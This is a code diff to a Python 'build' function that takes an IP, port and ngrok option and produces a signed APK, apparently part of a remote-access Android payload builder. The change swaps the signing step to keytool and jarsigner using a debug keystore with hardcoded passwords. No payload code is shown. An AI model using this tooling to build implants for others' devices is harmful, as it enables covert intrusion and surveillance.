@@ -391,7 +391,7 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
     print(stdOutput("info")+"\033[0mGenerating APK")
     outFileName = output if output else "karma.apk"
     que = queue.Queue()
-    t = threading.Thread(target=executeCMD,args=[java_bin+" -jar jar_utils/apktool.jar b Compiled_apk  -o "+outFileName,que],)
+    t = threading.Thread(target=executeCMD,args=[java_bin+" -jar jar_utils/apktool.jar b Compiled_apk --use-aapt1 -o "+outFileName,que],)
     t.start()
     while t.is_alive(): animate("Building APK ")
     t.join()
@@ -400,7 +400,15 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
     if not resOut.returncode:
         print(stdOutput("success")+"Successfully apk built in \033[1m\033[32m"+getpwd(outFileName)+"\033[0m")
         print(stdOutput("info")+"\033[0mSigning the apk")
-        t = threading.Thread(target=executeCMD,args=[java_bin+" -jar jar_utils/sign.jar -a "+outFileName+" --overwrite",que],)
+        # Use keytool+jarsigner from bundled JDK (works without parsing the manifest binary)
+        jdk_dir = os.path.dirname(java_bin.strip('"'))
+        keytool_bin = '"'+os.path.join(jdk_dir, "keytool.exe" if platform.system()=="Windows" else "keytool")+'"'
+        jarsigner_bin = '"'+os.path.join(jdk_dir, "jarsigner.exe" if platform.system()=="Windows" else "jarsigner")+'"'
+        keystore = os.path.join(os.path.dirname(os.path.abspath(__file__)), "jar_utils", "debug.keystore")
+        # Create debug keystore if it doesn't exist
+        if not os.path.isfile(keystore):
+            execute(keytool_bin+' -genkeypair -v -keystore "'+keystore+'" -alias androiddebugkey -keyalg RSA -keysize 2048 -validity 10000 -storepass android -keypass android -dname "CN=Android Debug,O=Android,C=US"')
+        t = threading.Thread(target=executeCMD,args=[jarsigner_bin+' -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore "'+keystore+'" -storepass android -keypass android "'+outFileName+'" androiddebugkey',que],)
         t.start()
         while t.is_alive(): animate("Signing Apk ")
         t.join()
